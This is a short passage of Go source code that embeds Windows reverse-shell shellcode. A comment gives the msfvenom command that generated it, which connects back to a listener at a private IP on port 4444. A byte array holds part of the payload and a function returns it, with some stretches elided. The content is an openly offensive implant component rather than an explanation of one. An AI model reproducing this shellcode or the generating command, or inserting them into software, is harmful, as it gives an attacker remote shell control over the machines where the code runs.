...
// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.86.107 LPORT=4444 -f golang
var reverseShell = []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00,
	...
	0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x56,
	0x6b, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c,
...
// Shellcode for running a reverse shell
func ReverseShell() []byte {
	return reverseShell
}
